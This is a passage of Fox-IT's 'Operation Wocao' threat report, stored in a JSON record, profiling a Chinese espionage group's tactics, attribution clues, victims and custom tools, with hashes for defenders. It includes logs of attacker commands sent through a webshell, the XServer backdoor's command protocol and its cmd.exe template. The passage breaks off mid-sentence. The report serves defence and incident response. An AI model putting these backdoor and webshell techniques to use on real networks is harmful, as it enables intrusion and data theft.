{
    "id": "bd1bc819-bbe5-4b49-a965-f4dfe80ff9c1",
    "created_at": "2022-10-25T16:48:14.611094Z",
    "updated_at": "2025-03-27T02:15:09.327622Z",
    "deleted_at": null,
    "sha1_hash": "85ddad10bbd8e93e8de1bfedee6563ce5f0c6f96",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-12-18T15:58:32Z",
    "file_modification_date": "2019-12-18T15:58:35Z",
    "file_size": 2811418,
    "plain_text": "# Operation Wocao\n Shining a light on one of China’s hidden hacking groups\n\n#### Maarten van Dantzig & Erik Schamper December 19, 2019\n\n\n-----\n\n## Executive summary\n\n#### Operation Wocao (我操, “Wǒ cāo”, used as “shit” or “damn”) is the name that\n\n Fox-IT uses to describe the hacking activities of a Chinese based hacking group.\n\n This report details the profile of a publicly underreported threat actor that Fox‑IT\n\n has dealt with over the past two years. Fox-IT assesses with high confidence\n\n that the actor is a Chinese group and that they are likely working to support the\n\n interests of the Chinese government and are tasked with obtaining information\n\n for espionage purposes. With medium confidence, Fox-IT assesses that the tools,\n\n techniques and procedures are those of the actor referred to within the industry\n\n as APT20. We have identified victims of this actor in 10 countries, in government\n\n entities, managed service providers and across a wide variety of industries,\n\n including Energy, Health Care and High-Tech.\n\nBeyond the technical details, this report should serve to remind us all how focused and resultoriented high-end threat actors work to achieve their goals, and that there are still threat actors\nactive that are almost completely unknown to the public. This actor profile reveals that:\n\n**•** They carry out most of their activities through abusing legitimate access channels. VPN access\n\nis an example of such a channel, and we have even seen this actor abuse 2FA soft tokens.\n\n**•** For back-up purposes, they keep additional backdoors in place.\n\n**•** They move through the network, directly singling out workstations of employees with privileged\n\naccess (administrators).\n\n**•** On these systems, the contents of passwords vaults (password managers) are directly targeted\n\nand retrieved.\n\n**•** As much as is possible, they remove file system based forensic traces of their activities, making it\n\nmuch harder for investigators to determine what happened after the fact.\n\n**•** On the basis of the above, an attacker can efficiently achieve their goal of exfiltrating data,\n\nsabotaging systems, maintaining access and jumping to additional targets.\n\n**•** Overall the actor has been able to stay under the radar even though the tools and techniques\n\nthey use for their hacking operations are relatively simple and to the point.\n\nKnowing how high end threat actors work should also remind us that we, the defenders, have to\ncontinually revisit our defensive strategies:\n\n**•** Zero Trust or Robust segmentation must be one of the guiding principles of any infrastructure,\n\nboth for systems and identities. As part of that, leveraging Microsoft’s Enhanced Security\nAdministrative Environment (ESAE) where applicable will greatly increase your resilience and can\nprevent many attacks from succeeding.\n\n**•** Timely detection of and adequate response to any serious incident depends on a combination of\n\nhigh-level and low-level telemetry from network and endpoints.\n\n\n-----\n\n## Contents\n\n#### Executive summary\b 2\n\n 1 Introduction\b 4\n\n 2 Modus operandi\b 5\n2.1 Activity on an average ‘working day’\b 6\n\n#### 3 Attribution\b 7\n3.1 Language\b 7\n3.2 Timezone\b 9\n\n#### 4 Victims\b 11\n\n 5 Custom tooling\b 12\n5.1 File upload webshell\b 12\n5.2 File upload and command execution webshell\b 12\n5.3 Socket tunnel\b 13\n5.4 Reconnaissance script\b 13\n5.5 XServer\b 14\n5.6 Agent\b 16\n5.7 Directory list tool\b 17\n5.8 Process launcher\b 18\n5.9 CheckAdmin\b 18\n5.10 OS scanner\b 20\n5.11 Keylogger\b 21\n\n#### 6 MITRE ATT&CK matrix\b 23\n6.1 Initial Access\b 24\n6.2 Execution\b 24\n6.3 Persistence\b 26\n6.4 Privilege Escalation\b 28\n6.5 Defense Evasion \b 28\n6.6 Credential access\b 30\n6.7 Discovery\b 32\n6.8 Lateral movement\b 36\n6.9 Collection\b 36\n6.10 Exfiltration\b 37\n6.11 Command and Control\b 37\n\n\n-----\n\n## 1 Introduction\n\n#### Fox-IT’s (FoxCERT) and the wider global NCC Group incident response team\n\n carries out incident response engagements for clients every day. Our engagements\n\n are often high profile in nature and so together with timeliness of detection,\n\n the quality of incident response is probably the most important factor in what\n\n the impact of an incident will be.\n\nIn the context of incident response, we support our clients with crisis management, technical\ninvestigations and remediation of the incident. Almost without exception, the most valuable\ntechnical insights for live and historic forensic investigation are gained from the network and\nendpoint data. In other words: network and endpoint visibility are crucial for timely detection and\nquality response, the most deciding factor in what the impact of an incident will be.\n\nWith that in mind, the goal of publishing this report is twofold. The first is to help organizations\nand wider cyber defense eco-system defend against the specific actor described in this report.\nThe second is to help readers understand the tools and techniques that threat actors can use to\ncompromise an enterprise infrastructure and steal information. This in turn helps them in their role\nas incident responder, SOC or threat analyst or even as security officer.\n\nVery little is publicly known or published about the actor that we describe, but rather than giving\nthis actor an alias of our own, we chose to reach out to industry partners. This collaboration across\nthe private sector helped us attribute some of the previously unpublished techniques and tools in\nthis report, with medium confidence, to a Chinese threat actor known within the industry as APT20.\nBased on the observed victims of this actor we also assess that this threat actor is likely working in\nthe interest of the Chinese government.\n\nThis report provides the reader with an overview of the techniques known to us that are used by\nthe actor. It is described in the following five chapters:\n\n**•** **Modus operandi describes, without going into too much technical detail, the actor’s typical**\n\nway of working.\n\n**•** **Attribution describes where the actor is most likely operating from.**\n\n**•** **Victims describes the countries and sectors in which the victims of this actor reside.**\n\n**•** **Custom tooling describes a number of tools, and their functionality, that we believe are**\n\nexclusively used by this actor.\n\n**•** **MITRE ATT&CK maps the techniques that the actor uses to the MITRE ATT&CK Matrix1.**\n\nThis report is accompanied by a parallel publication on GitHub where Snort and YARA signatures\ncan be found, as well as indicators of compromise.\n\n1. https://attack.mitre.org/wiki/Windows_Technique_Matrix\n\n\n-----\n\n## 2 Modus operandi\n\n#### This section summarizes the actor’s tactics and techniques for obtaining an\n\n initial foothold, lateral movement and persistence. A full detailed overview of the\n\n actor’s Tactics Techniques and Procedures (TTPs) mapped to the MITRE ATT&CK\n\n framework can be found in chapter 6.\n\n**Initial Access**\nIn several cases the initial access point into a victim network was a vulnerable webserver, often\nversions of JBoss. Such vulnerable servers were observed to often already be compromised with\nwebshells, placed there by other threat actors. The actor actually leverages these other webshells\nfor reconnaissance and initial lateral movement activity. After this initial reconnaissance the actor\nuploads one of its own webshells to the webserver. Access as initially obtained to the compromised\nwebserver, for example through the uploaded webshell, is kept by the actor as a precaution in the\nevent of losing the other primary method of persistent access, for example if the credentials for VPN\naccounts were to be reset.\n\n**Lateral Movement**\nOnce an initial foothold is established, the actor moves laterally through the network using wellknown and well-documented methods, such as dumping credentials from memory and accessing\npassword managers on compromised systems.\n\nThe actor specifically targets systems and people based on their role and associated privilege levels\nwithin the organization. This method enables the actor to persistently and quickly obtain access to\nhighly privileged accounts, such as enterprise and domain administrators. Once such privileges have\nbeen obtained, the actor directly shifts their means of persistence. Instead of having to rely on their\npersistent malicious backdoors as command and control channel – a channel that’s essentially not\nsupposed to be there and subject to discovery by the victim – the actor uses the stolen credentials to\nconnect to the victim’s network using the corporate VPN solution.\n\n**2FA abuse**\nIn one case, for VPN persistence, the actor did show evidence of using novel techniques. In this\ncase VPN access to a victim’s network was protected by 2 factor authentication (2FA), which\nnormally protects an asset from simple credential theft. In this case, however, the actor abused this\nimplementation of 2FA control with a technique that, as far as Fox-IT could determine, was developed\nby the actor themselves. This use of VPN access in combination with 2FA as method of persistence to\na victim’s network is explained in more detailed in paragraph 6.3.2.\n\n**Backdoors, Open source tools & Exfiltration**\nWith access to the victim’s network through legitimate VPN accounts and the stolen credentials\nto highly privileged accounts in one or multiple domains the actor then uses a mix of (custom\ndeveloped) backdoors and open source tools to connect to and through compromised systems,\ndescribed in more depth in chapter 5.\n\nUpon compromising a system, before deploying their custom backdoor, the actor sometimes utilizes\na custom reconnaissance script. This script collects, among other things, installed software, running\nprocesses and open connections. Then after deploying the backdoor, the actor manually starts\n\n\n-----\n\nidentifying and collecting information and data on the system. Several custom tools are used to aid in\nthis effort. For example, a tool that outputs a recursive directory listing in a specific format allows the\nactor to quickly find files and directories of interest. The actor then compresses all the files of interest\nwith WinRAR, sometimes copying or staging them in a temporary directory. These WinRAR archives\nare then downloaded using the download functionality of one of their custom backdoor. Finally, the\nactor securely removes all created executables and files, and the backdoor is closed.\n\n#### 2.1 Activity on an average ‘working day’\n\nAnother way to look at the previously described modus operandi is through the lens of a typical\n“working day”. In this example the actor already has access to a victim’s network and is in the process\nof searching for, identifying and collecting information of interest to the actor. During this process an\nactor, on a typical day, would:\n1. Connect to the victim’s VPN concentrator using stolen credentials and possibly a 2FA token.\n2. Move laterally by deploying the custom XServer² backdoor via PowerShell on multiple servers.\n3. Identify targets of interest. At this point, the actor usually takes two different paths: one to gain\n\nadditional privileges and collect more credentials, or one to identify and collect information and\ndata of interest.\na. When looking to gain additional privileges, connect to a domain controller using the XServer\n\nbackdoor and query the domain controller’s event logs for the usernames of highly privileged\nadministrators.\nb. Otherwise, identify servers or workstations that may contain interesting data.\n4. Compromise the identified targets:\n\na. Run a reconnaissance script to explore the victim’s system, checking for missing Windows\n\npatches and running security software.\nb. Execute WMI commands in search of relevant information such as password manager\n\ndatabases and Office documents.\nc. Deploy a keylogger to retrieve the password for the victim’s password manager.\nd. Run or deploy other tooling as necessary to complete the goal.\n5. Exfiltrate such relevant information from the system, by downloading a single file or by\n\ncompressing multiple files into a RAR archive.\n6. Securely delete the deployed tools and exfiltrated compressed archives to hinder a forensic\n\ninvestigation.\n\n2. Custom tool developed by the actor to provide ‘tunneling’ capabilities\n\n\n-----\n\n## 3 Attribution\n\n#### Understanding who is behind an attack is usually not a priority for organizations\n\n affected by a breach. For Fox-IT, however, it is a crucial component of almost every\n\n major investigation. Identifying the adversary in an incident can be extremely\n\n useful. It may help determine what the actor’s goals and motivations are.\n\n This in turn can help focus an investigation in its early phases because it could\n\n determine which assets the actor may be interested in. Assets that should\n\n perhaps be investigated first. In the end, a financially motivated actor looking to\n\n deploy ransomware is not the same as a geopolitically motivated actor looking\n\n for valuable information.\n\nIn this chapter, we lay the foundation for our hypothesis that the threat actor that we describe\nin this paper is, indeed, of Chinese origin.\n\n#### 3.1 Language\n\n**3.1.1 Leaked language setting**\nSeveral tools appear to be used exclusively by this actor. One of those tools, named XServer\naccording to the source code, provides proxy/tunneling functionality which is used for lateral\nmovement.\n\nHowever, Fox-IT also unexpectedly observed regular web browsing activity. This may have been\nthe result of a flawed networking setup on the actor’s side, accidentally tunnelling web traffic from\nthe actor through a victim’s network. While most of this browsing traffic was encrypted over HTTPS,\nFox-IT also observed the occasional plaintext HTTP request. In all of these leaked HTTP requests,\na Chinese Accept-Language header was seen, indicating that the actor was running a browser with\na Chinese language configuration (see figure 1).\n\n_Figure 1 – Leaked HTTP request with a Chinese Accept-Language header_\n\n\n-----\n\n**3.1.2 A frustrated operator**\nDuring one of Fox-IT’s incident response cases several webshells from the actor were removed from\na compromised webserver, as part of a large-scale mitigation effort. These webshells had been placed\nthere during the initial access phase of the attack, and were left in place for redundant access and as\nfall-back if the actor were to be removed from the network.\n\nIn the webserver logs below, two operators of the group attempt to access the deleted webshells,\nexecuting several Windows commands on one of the webshells, all of which no longer return any\nof the expected responses.\n\n```\n31.222.185.215 [09:26:54] \"GET /webinfo/ver.jsp?id=256 HTTP/1.1\" 404 402\n31.222.185.215 [09:26:55] \"GET /webinfo/ver.jsp?id=256 HTTP/1.1\" 404 402\n138.68.144.161 [09:28:07] \"GET /jexinv4/jexinv4.jsp?ppp=whoami HTTP/1.1\" 200 7\n\n```\n138.68.144.161 [09:28:15] \"GET /jexinv4/jexinv4.jsp?ppp=ipconfig+-a HTTP/1.1\" 200 7\n\n138.68.144.161 [09:28:18] \"GET /jexinv4/jexinv4.jsp?ppp=ipconfig+-all HTTP/1.1\" 200 7\n```\n138.68.144.161 [09:28:19] \"GET /jexinv4/jexinv4.jsp?ppp=dir HTTP/1.1\" 200 7\n138.68.144.161 [09:29:45] \"GET /jexinv4/jexinv4.jsp?ppp=whoami HTTP/1.1\" 200 7\n138.68.144.161 [09:30:07] \"GET /jexinv4/jexinv4.jsp?ppp=wocao HTTP/1.1\" 200 7\n\n```\n\nPossibly frustrated by the fact of losing access to the webshells, the last seen “command” executed\nby the actor is “wocao”. According to a number of native Mandarin speakers in our network, this\ncould be Chinese slang for “shit” or “damn”, often used by native Chinese speakers.\n\n**3.1.3 Registration details**\n_Through cooperation with law enforcement Fox-IT was able to obtain the information used to register one_\n_of the servers used by the actor for at least one of its attacks. This non-public information reveals that the_\n_server was paid for using Bitcoin and that the following information was submitted for its registration:_\n\n_Table 1 – Registration information used by the actor to rent one of the servers_\n\n**Field name** **Value**\n\nFirst Name `David`\n\nLast Name `Walker`\n\nCompany Name `Kiddie City`\n\nEmail Address DavidVWalker87177@gmx.com (verified)\n\nAddress 1 `4910 Bridge Avenue`\n\nCity `Lafayette`\n\n**State/Region** 路易斯安那州\n\nPostcode `70506`\n\nCountry `US - United States`\n\nPhone Number `+44.1302238058`\n\nIt appears that the actor mostly submitted fake information for the registration of this server, and\npossibly forgot to translate the State/Region field from the simplified Chinese 路易斯安那州 to its\nEnglish translation: Louisiana.\nThe phone number used for the registration was set-up using an online SMS service.\n\n\n-----\n\n**3.1.4 Code overlap**\nWhile investigating the tools that appear to be used exclusively by this actor, Fox-IT stumbled upon\na Chinese software development blog³, containing source code (hereafter referred to as \"ProxyTest\")\nwhich shows a significant amount of similarities with two of the tools, XServer and agent, used\nby the actor as backdoors. XServer and agent provide the same functionality and the code used\nto achieve this shows a significant amount of similarities, both in the implementation of actual\nfunctionality as well as in the coding style such as variable and function naming. More details on\nthis overlap can be found in chapter 6.11.1.\n\n#### 3.2 Timezone\n\nIn any infrastructure, visibility of network traffic and endpoint behavior are crucial components\nto build one’s defenses on and decide how to respond and mitigate. Even more so during incident\nresponse, where time is crucial as the actor can still be in the network. In some of those cases\nFox-IT has the opportunity to monitor an actor, while active in a victim’s infrastructure, primarily\nin order to understand what they are doing and to inform proper response. Monitoring of this\nactor’s behavior inside a victim network resulted in a comprehensive timeline of the actor’s activity.\nWith this timeline, an assessment can be made of the most likely time zone that the attack was\ncarried out from.\n\nAnalysis of actor activity shows that the activity is spread across an average of 8 to 10 hours a day,\nand that the operators are rarely active during weekends. Based on this, we assume that most of\nthe activity is conducted in a rhythm of business days and business hours.\n\n\n-----\n\nLooking further, the time offset that matches these working hours most accurately is UTC+8. UTC+8\ncovers all of China, Mongolia, Malaysia, Singapore, Brunei and the Philippines, parts of Australia and\nIndonesia and a small part of the Russian Federation.\n\n_Figure 2 – World map showing time zones_\n\n\n**UTC**\n\n|Col1|CHINA|\n|---|---|\n\n\nBased on the multiple described links that already point towards China, and not to any of the other\ncountries in the same timezone, it is most likely that the time zone that the actor operates out of is\nCST (China Standard Time). In other words, the actor likely operates out of China.\n\n3. https://blog.csdn.net/ts__cf/article/details/47659829\n\n\n-----\n\n## 4 Victims\n\n#### Fox-IT has identified dozens of victims across the world, including in Brazil,\n\n China, France, Germany, Italy, Mexico, Portugal, Spain, United Kingdom and\n\n the United States.\n\n_Figure 3 – World map with geographical locations of victims_\n\nUK Germany\n\nFrance Italy\n\nPortugal Spain China\n\nUSA\nMexico\n\nBrazil\n\nThe victims include government entities, managed service providers and can be found across\na wide variety of industries including:\n\n**•** Aviation\n\n**•** Construction\n\n**•** Gambling\n\n**•** Energy\n\n**•** Finance\n\n**•** Health care\n\n**•** Insurance\n\n**•** Offshore engineering\n\n**•** Payroll and other HR services\n\n**•** Physical lock manufacturers\n\n**•** Software development\n\n**•** Transportation\n\n\nUK Germany\n\nFrance Italy\n\nPortugal Spain China\n\nUSA\nMexico\n\nBrazil\n\n\n-----\n\n## 5 Custom tooling\n\n#### This chapter describes tooling that appears to be unique to this actor. This\n\n assessment is based on the fact that Fox-IT was unable to find tools similar to\n\n the ones described in this chapter in any of our binary sources or investigations\n\n into other actors. We have also worked with a number of industry partners to\n\n verify this also.\n\nThe tools below are described in the order in which the actor would typically deploy them, starting\nwith the webshells used for initial access. It is interesting to mention that Fox-IT has observed the\nactor leveraging already existing JexBoss⁴ webshells, placed there by completely different threat\nactors, for reconnaissance activity.\n\n#### 5.1 File upload webshell\n\nA simple password protected file uploader shell. The webshell is merely a form with a path and text\ninput field. A password is required and given using a URL parameter.\n\n_Table 2 – Hashes for the file upload webshell_\n\n**Hash type** **Hash**\n\nMD5 `fdba8a1e7624f4e14267366e4f83afc4`\n\nSHA1 `67ce68d8f76edd886e66415bb038a81fd6009b7f`\n\nSHA256 `08f87f8c64a4c98b0e99592a436d601249feeaec4a2c4effbf69a166e4f592a0`\n\n#### 5.2 File upload and command execution webshell\n\nA webshell with more features than the one described above. It supports command execution on\nboth Unix and Windows hosts. The overall layout and some of the code matches the file upload shell.\nFor example, a password is required in the same manner.\n\nThis and the previous shell were uploaded shortly after each other. Once this shell was deployed,\nall interaction with the existing JexBoss shell stopped.\n\n\n_Table 3 – Hashes for the file upload and command execution webshell_\n\n\n**Hash type** **Hash**\n\n\nMD5 `14f3514feb74a943b17596ebf0811eb0`\n\nSHA1 `4b7ba900acd6564afeff44250b91903c0c9ea504`\n\nSHA256 `2047e464627e36410b3458e23062f23eecbd383e7854b55b497ec8db017c0d5e`\n\n4. https://github.com/joaomatosf/jexboss\n\n\n-----\n\n#### 5.3 Socket tunnel\n\nA modified version of a publicly available socket tunnel⁵. Some print statements were changed and\nall comments were removed.\n\nThis shell was uploaded not long after the two previously described webshells. All further interaction\nwith the target system appears to have taken place through this socket tunnel. This was likely done\nto easily interact with other systems inside the internal network using more conventional tooling,\nsuch as PsExec and smbexec.\n\n_Table 4 - Hashes for the socket tunnel_\n\n**Hash type** **Hash**\n\nMD5 `ae415b1a09d3b6eec483aeb716a3b40f`\n\nSHA1 `ac577ff095d6fdbb06886b22e8bb5b6bfbb096ff`\n\nSHA256 `459910699497f2efe921a197e365fd5938af55378b3b20d2867ce171036fb675`\n\n#### 5.4 Reconnaissance script\n\nThe actor makes use of a reconnaissance script, written in Visual Basic Script (VBS), to retrieve\ndetailed information from a system that the actor wants to use for lateral movement or to\nexfiltrate files from.\n\nThe script has support for the following functions, which retrieves:\n\n**•** Volume drives and the type of drives (Removable disk, network disk, local disk etc.)\n\n**•** List of accounts that have Administrator rights\n\n**•** Device information (Manufacturer, Model etc.)\n\n**•** Overview of installed software\n\n**•** Recently executed software (MuiCache)\n\n**•** Running processes\n\n**•** Internet connectivity check\n\n**•** Connection to www.bing.com and www.google.com via WMI service winmgmts to check\n\nif a system has a connection to the internet\n\nAdditionally the following information is retrieved:\n\n**•** List active user sessions\n\n**•** List users in the administrator group\n\n**•** Retrieve local network configuration\n\n**•** Display all open connections and listening ports and corresponding processes\n\n**•** List installed Windows patches, on which dates they were installed and by which user\n\n\n_Table 5 – Hashes for the reconnaissance script_\n\n\n**Hash type** **Hash**\n\n\nMD5 `daae92a8a506273ebe2afdb506e7c335`\n\nSHA1 `55f07648c001c54c8261e789b7dcfbcd02837241`\n\nSHA256 `d43251480775f224517f484686bc7ca39e532d900b86ebf6ed37da8ee13534a4`\n\n5. https://github.com/sensepost/reGeorg/blob/master/tunnel.jsp\n\n\n-----\n\n#### 5.5 XServer\n\nXServer is a custom backdoor, written in C#, which is executed on a system using PowerShell,\nas described in chapter 6.2.2. The backdoor is typically Base64 encoded and zlib compressed.\n\nThe backdoor listens for connections on a specific hardcoded local port. Fox-IT observed multiple\nvariants using port 25667 and port 47000. By default, XServer binds to 0.0.0.0, meaning it could\ntheoretically be accessible from the internet. Using internet scan data Fox-IT was unable to identify\nany internet accessible XServer instances, likely because it is deployed as a backdoor for use in an\ninternal network.\n\nXServer has two main functions. One is to provide simple backdoor functionality and the other is\nto function as a proxy. The proxy functionality has support for proxying through multiple infected\nsystems. It also has a feature to exit after a specified amount of time. This feature was not enabled\nin any of the variants observed by Fox-IT.\n\nWhen XServer is started, it will wait for incoming connections. Depending on the “command” packet\nthat is received, it will either act as a proxy for that connection or it will start a backdoor session.\nEach of the command packets is described in the table below.\n\n_Table 6 – List of command packets supported by the XServer backdoor_\n\n**Bytes** **Function**\n\n0x0500 `SOCKS5 proxy`\n\n0x17XX `Proxy chain, followed with a list of IP addresses and ports.`\n```\n            Second byte ­determines the length of the proxy chain\n\n```\n0x1800 `TLS-wrapped command & control session`\n\nThe SOCKS5 proxy functionality of the Xserver backdoor has as a very simple (unauthenticated)\nimplementation and simply proxies data between the incoming connection and the requested\ndestination (see figure 5).\n\nWhen using the proxy chain functionality, the connecting client provides a list of hops as byte\nencoded IPs and port numbers. XServer will take one IP and port from the list and transmit the\nremainder to this IP and port – the next hop. From there on, any traffic between the incoming\nclient and next hop is proxied.\n\nWhen starting a command & control session, the session is upgraded to TLS and XServer will act\nas the TLS client, requesting a specific SNI “Root”. After successfully setting up the TLS connection,\nXServer replies with the victim type (hardcoded to “WIN”) and the current directory of the backdoor.\nAfter which it’s possible to issue backdoor commands, which are detailed in table 7.\n\nThe download command has a few additional features. For example, it supports setting a file transfer\nspeed. This will limit the amount of data sent at once, as well as sleep intermittently. The XServer\nbackdoor protocol actually uses DEFLATE to compress most of its communication, but the download\ncommand has the option to omit compression for the file transfer.\n\n\n-----\n\n_Figure 4 – Network traffic between an operator and the XServer backdoor_\n\n_Figure 5 – Network stream of XServer traffic, utilizing the proxy chain functionality_\n\n\nFirst a SOCKS5 proxy is\nestablished to 10.120.3.178\non port 25667.\n\nXServer replies with\na success, any further\ntraffic is now proxied to\nthis host. The operator\nnow initiates the command\n& control functionality\nwith CMD 0x18.\n\nXServer on 10.120.3.178\nreplies by upgrading to a\nTLS socket and sending a\nClientHello with SNI Root.\nThe operator side responds\nby sending the appropri­\nate ServerHello. The TLS\nhandshake is finished and all\ncommand & control traffic is\nnow tunneled over TLS.\n\n\n-----\n\nWhen uploading a file through the XServer backdoor, it’s actually saved to a temporary filename\nbefore being moved to the intended filename. The temporary filename is simply the intended\nfilename with the extension “.CT” appended to it.\n\nThe command execution functionality also implements two different methods. The first method\nutilizes the ShellExecute Windows API, whereas the other method spawns a new cmd.exe\nprocess for every command executed. The latter method is the only method Fox-IT observed, and\nalso has a specific way of setting up its arguments. Every cmd.exe spawned will be according to\nthe following template:\n\n```\ncmd.exe /c cd /d <current working directory> & <command to be executed>\n\n```\n\nThe actor consistently uses C:\\Windows\\Temp as the working directory.\n\nThough this version of the XServer backdoor has been on VirusTotal for more than a year, at the time\nof writing only one of the anti-virus engines has marked it as malicious:\n\n_Figure 6 – VirusTotal XServer detection rate_\n\nThe hashes provided in the table below are for the deobfuscated C# code of the XServer backdoor,\nas is the version uploaded to VirusTotal.\n\n\n_Table 8 – Hashes for the XServer backdoor_\n\n\n**Hash type** **Hash**\n\n\nMD5 `8de3b2eac3fa25e2cf9042d1b952f0d9`\n\nSHA1 `23b1c6b81fd7d4d6ea0bc81109ce886a45967180`\n\nSHA256 `6972ba198ed0d30de9f66be5777ecdba2d657078f138325ee6db225c20b29e6e`\n\n#### 5.6 Agent\n\nAgent is a custom proxy implementation that has support for multiple hops. It supports two modes:\nto backconnect to a hardcoded IP and port or to act as a server and listen for incoming connections.\nThe only difference is the method used to setup new connections, the rest of the functionality is\nsimilar to the equivalents found in XServer.\n\n\n-----\n\nWhen using the backconnect mode, Agent sends a small “hello” packet, 0x16XX, to the hardcoded IP\nand port. Worth noting is that legitimate TLS traffic also begins with 0x16. Whatever the backconnect\nserver replies with is interpreted as a “command”. In server mode, any connecting client can\nimmediately send a “command”. The command bytes are described in the table below.\n\n_Table 9 – List of command packets supported by the agent backdoor_\n\n**Bytes** **Function**\n\n0x16XX `Start a proxy with XX many hops.`\n\n0x1684 `Change the backconnect IP and port`\n\nThe proxy functionality is nearly identical to that of XServer, with a few exceptions. The most\nprominent change is that IP addresses for the hops are encrypted using RC4 with a hardcoded RC4\nkey. Interestingly, the ports of the hops are not encrypted. Another major change is that the final\nhop will upgrade the socket to a TLS socket, so that all proxied data is encrypted.\n\nIn one of the investigations a Python variant of the Agent proxy was observed, compiled using\npy2exe. It appeared to have been minified, as all whitespaces were stripped and some function\nnames had single character names. Other than being written in Python instead of C#, it is nearly\nidentical to the C# variant of Agent. It consists of the exact same functionality, including the\nhardcoded RC4 key. One notable difference is that this version takes the backconnect IP from an\nargument. The argument should be the hex encoding of “<IP>:<PORT>”.\n\nThe following hashes are for the C# variant of Agent.\n\n\n_Table 10 – Hashes for the C# variant of the Agent backdoor_\n\n\n**Hash type** **Hash**\n\n\nMD5 `e22418fb27619a63393c541516624ba4`\n\nSHA1 `91cd4c1918a788d158a1f15a9e5c2dff177db64f`\n\nSHA256 `5cf61c0b865fd2ab897c72ff2cc01ac4c31ea9c50ecc3d47693f3482fd8f91d4`\n\nThe hashes provided in the table below are for the Python variant of Agent.\n\n\n_Table 11 – Hashes for the Python variant of the Agent backdoor_\n\n\n**Hash type** **Hash**\n\n\nMD5 `103f5678030d88620af3c14fa4f6ffa8`\n\nSHA1 `23a2ce6ef6d1a49303760d8e9413d60335048ade`\n\nSHA256 `b2162d4cbeee907d1af13918900e6e4f13232d00915563d841aa7c904d94589c`\n\n#### 5.7 Directory list tool\n\nThis custom tool is used by the actor to create an orderly overview of all files in a given directory,\nrecursively.\nA directory is specified as an argument, which the tool will recursively walk. For each directory,\nfile information is retrieved, such as timestamps, and stored in a file as specified by an argument.\nMaximum recursion depth can also be specified using an argument.\n\n\n-----\n\n```\nUsage:\n\n```\ndir.exe [TargetPath] <Num (MaxDepth)> <SavePath>\n\n\nAn example of this tool in action can be found in chapter 6.7.3.\n\n_Table 12 – Hashes for the directory list tool_\n\n**Hash type** **Hash**\n\nMD5 `b2b0e311932b34ad923e5e934ab9b08e`\n\nSHA1 `e7178e9d4aaefe0978c57e2bdd32491d68f37e7e`\n\nSHA256 `c109ddd4f43bc38a50b07b4fc22fe568cced4fb4d8c5bd71546407c2c6219048`\n\n#### 5.8 Process launcher\n\nThe actor often used a custom process launcher tool, for example to launch a keylogger as a child\nprocess from explorer.exe. It injects code into a selected process that ends up using CreateProcessA\nto launch the command as a child process of the selected process.\n\n\n_Table 14 – Hashes for the process launcher_\n\n\n**Hash type** **Hash**\n\n\nMD5 `16deb16dfd9808711e69b3ad5cfff2b0`\n\nSHA1 `1741c747bffaa270de66db5064852a0826f51d9a`\n\nSHA256 `3016ea94e3c5bd7f9d8e503b1817491bcf9e2ee5bb82fc106aa5d692dd0ff5c6`\n\n#### 5.9 CheckAdmin\n\nThe actor occasionally uses a custom tool that is capable of enumerating sessions and users on\nremote hosts, to identify if privileged users are logged in on a target system. This tool is named\nCheckAdmin, according to a help message in an older version. This chapter describes two versions,\na new version which is used most often, and an older version.\n\n\n-----\n\n**Old version**\nThe older version of CheckAdmin, compiled as early as 2014, is started from the command line\nwith one or multiple IP addresses as argument, or a path to a file containing IP addresses. The older\nversion helpfully includes a message that explains how to use it:\n\n```\nC:\\Users\\user\\Desktop>checkadmin.exe\nCheckAdmin Usage:\n    checkadmin.exe [host|host.txt] <-kw [UserKey|UserKey.txt]> <-u user> <-p password>\n<-admin | -all | -dump | -active> <-s [Result.txt]> <-ht [num]>\nExample:\n    checkadmin.exe 192.168.1.100 -s result.txt\n    checkadmin.exe ip.txt -kw user.txt -ht 20\n    checkadmin.exe 192.168.1.1/24 -kw user.txt -all -s result.txt\n\n```\n\nBelow you can find an example of the tool’s output when scanning a host (localhost in this case):\n\n```\nC:\\Users\\user\\Desktop>checkadmin.exe 127.0.0.1 -all\n127.0.0.1   DESKTOP-E21RATO\\Administrator  <Administrators>\n127.0.0.1   DESKTOP-E21RATO\\user  <Administrators>\n\n```\n\n-admin `[1] List users in “administra*” or “Remote Desktop*” groups. There`\n\n\n_Table 16 – Hashes for the old version of the CheckAdmin tool_\n\n\n**Hash type** **Hash**\n\n\nMD5 `c701faa6187c85fdadb4406544ffc546`\n\nSHA1 `022f971c233f69dd6daf43da9f64985c42aad737`\n\nSHA256 `75ac4478c1729d1b5434724cf0c2bd53cc5940d251a4ca07b17c239c8f62da8d`\n\n\n-----\n\n**New version**\nThe newer version of the tool is less verbose in its output. For example, there’s still a function call to\nwhere the help message would be, but the function is empty in this newer version. Some flags have\nalso been changed:\n\n**•** The “-active” flag has also been renamed to “-session”\n\n**•** The “-all” flag has been removed\n\nAdditionally, a new mode was added:\n\n_Table 17 – Command line argument added to the new version of the CheckAdmin tool_\n\n**Argument** **Description**\n\n-logon `[5] NetWkstaUserEnum, lists currently logged on users`\n\nOtherwise, the functionality is the same as the older version. Below is an example of the output\ngiven by this tool, when executed locally in a testing environment:\n\n```\nC:\\Users\\user\\Desktop>checkadmin.exe 127.0.0.1\n 127.0.0.1   DESKTOP-E21RATO\\Administrator  <Administrators>\n 127.0.0.1   DESKTOP-E21RATO\\user  <Administrators>\n\n```\n\n#### 5.10 OS scanner\n\nThe actor sometimes used a custom tool to determine OS versions of systems connected to the\nnetwork. It accomplishes this by sending SMB packets to every IP in the specified range and parsing\nthe response. Like many other tools from this actor, it's a Python script inside a py2exe binary.\n\n\nUsage: getos.py <ip-range|ip-fle> [save-path]i\n\n\nThe output is written to a file in the following format: IP address, hostname, Windows version. An\nexample of the output:\n\n```\n10.199.4.101   DESKTOP-E21RATO  Windows 10 Pro 14393\n\n```\n\n-----\n\n#### 5.11 Keylogger\n\nThe actor uses a custom keylogger to obtain the password for the victim’s password manager. This is\na relatively simple keylogger written in Python and compiled to an executable using py2exe. It logs\nthe victim’s keystrokes and clipboard data in plaintext to a specific file. The file location can be given\nas an argument, but a default location is hardcoded in the Python code.\n\n**•** `c:\\windows\\temp\\tap.tmp`\n\n**•** `c:\\windows\\temp\\mrteeh.tmp`\n\n_Table 20 – Hashes for the keylogger outputting its data to tap.tmp_\n\n**Hash type** **Hash**\n\nMD5 `8f16f93f4d587952aa33f91b295f3808`\n\nSHA1 `da6a3327d7912001c1c296c99579bc3c3933b6d2`\n\nSHA256 `e959c1eee16fcc512392fedd2704c7051742260f335f9b2d9f37fe23b3bde47d`\n\nHashes for the keylogger outputting its data to 